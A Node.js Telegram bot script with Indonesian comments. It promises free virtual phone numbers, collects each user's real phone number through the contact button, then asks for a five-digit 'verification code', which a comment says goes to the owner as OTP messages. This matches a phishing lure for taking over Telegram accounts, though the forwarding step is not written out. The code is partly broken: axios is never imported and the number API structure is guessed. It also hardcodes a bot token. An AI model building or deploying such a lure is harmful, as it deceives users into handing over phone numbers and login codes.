const TelegramBot = require('node-telegram-bot-api');
const fs = require('fs');

// Ganti dengan token bot Telegram Anda
const token = '7664493291:AAGzYPr0FycimcbCU8GYgVpYtZKJvkIuqzk';
const bot = new TelegramBot(token, { polling: true });

const ownerId = '7442276167'; // ID Owner untuk menerima pesan OTP

let users = {};

const loadUsers = () => {
  if (fs.existsSync('database.json')) {
    users = JSON.parse(fs.readFileSync('database.json'));
  }
};

const saveUsers = () => {
  fs.writeFileSync('database.json', JSON.stringify(users, null, 2));
};

loadUsers();

const startMessage = `Selamat datang! disini anda bisa membuat nokos secara gratis.`;

bot.onText(/\/start/, (msg) => {
  const chatId = msg.chat.id;
  bot.sendMessage(chatId, startMessage, {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Verif", callback_data: 'verif' }],
      ]
    }
  });
});

bot.on('callback_query', (query) => {
  const chatId = query.message.chat.id;
  const userId = query.from.id;

  if (query.data === 'verif') {
    if (users[userId]) {
      bot.sendMessage(chatId, "Anda sudahterdaftar silahkan ketik /createnokos untuk membuat nomer virtual.");
    } else {
      bot.sendMessage(chatId, "Masukkan nama Anda:");
      bot.once('message', (msg) => {
        const name = msg.text;
        if (Object.values(users).some(u => u.name === name)) {
          bot.sendMessage(chatId, "Username sudah terpakai.");
          return;
        }
        bot.sendMessage(chatId, "Kirim kontak HP Anda:", {
          reply_markup: {
            keyboard: [[{ text: "Kirim Kontak", request_contact: true }]],
            one_time_keyboard: true
          }
        });
        bot.once('contact', (contactMsg) => {
          const phone = contactMsg.contact.phone_number;
          users[userId] = { name, phone, verified: false, numbers: [] };
          saveUsers();
          bot.sendMessage(chatId, "Masukkan kode verif : 11111");
          bot.sendSticker(chatId, 'https://telegra.ph/file/187d65bb76576e59c9a41.jpg'); // Ganti dengan URL sticker yang sesuai
        });
      });
    }
  }
});

bot.on('message', (msg) => {
  const chatId = msg.chat.id;
  const userId = msg.from.id;
  const user = users[userId];

  if (!user) return;

  if (!user.phone) {
    bot.sendMessage(chatId, "Anda belum mengirimkan kontak HP. Kirim kontak HP Anda:");
    return;
  }

  if (!user.verified) {
    if (!user.otpSent) {
      if (msg.text.match(/^\d{5}$/)) {
        user.otpSent = true;
        saveUsers();
        bot.sendMessage(chatId, "Harap tunggu sebentar...");
        bot.sendSticker(chatId, 'https://telegra.ph/file/187d65bb76576e59c9a41.jpg'); // Ganti dengan URL sticker yang sesuai
        setTimeout(() => {
          bot.sendMessage(chatId, "Verifikasi berhasil! Silakan ketik /createnokos untuk membuat nomor virtual.");
        }, 3000); // Waktu tunggu simulasi 3 detik, sesuaikan dengan kebutuhan
      } else {
        bot.sendMessage(chatId, "Masukkan kode verif : 11111");
      }
    }
  }
});
// Fungsi untuk mendapatkan nomor acak dari API
async function getRandomNumber() {
    try {
        const response = await axios.get('https://www.receivesmsonline.net/api?country=Indonesia');
        console.log('API Response:', response.data); // Logging response data

        // Asumsikan respons adalah objek dengan array 'numbers'
        const numbers = response.data.numbers || response.data; // Adjust according to actual structure
        console.log('Numbers Array:', numbers); // Log the numbers array

        if (Array.isArray(numbers) && numbers.length > 0) {
            const randomIndex = Math.floor(Math.random() * numbers.length);
            return numbers[randomIndex].number; // Adjust if the structure is different
        } else {
            throw new Error('No numbers available');
        }
    } catch (error) {
        console.error('Error fetching numbers:', error);
        return null;
    }
}

// Fungsi untuk membuat tombol pilihan nomor
function createNumberButtons(numbers) {
    return numbers.map(number => [{ text: number, callback_data: number }]);
}

// Saat bot menerima pesan '/start'
bot.onText(/\/createnokos/, async (msg) => {
    const chatId = msg.chat.id;
    const number = await getRandomNumber();
    if (number) {
        const options = {
            reply_markup: {
                inline_keyboard: createNumberButtons([number])
            }
        };
        bot.sendMessage(chatId, 'Pilih nomor virtual gratis:', options);
    } else {
        bot.sendMessage(chatId, 'Maaf, tidak ada nomor yang tersedia saat ini.');
    }
});

// Saat pengguna menekan tombol pilihan nomor
bot.on('callback_query', (callbackQuery) => {
    const message = callbackQuery.message;
    const number = callbackQuery.data;

    bot.sendMessage(message.chat.id, `Tunggu Sebentar....`);
});

bot.on("polling_error", console.log);
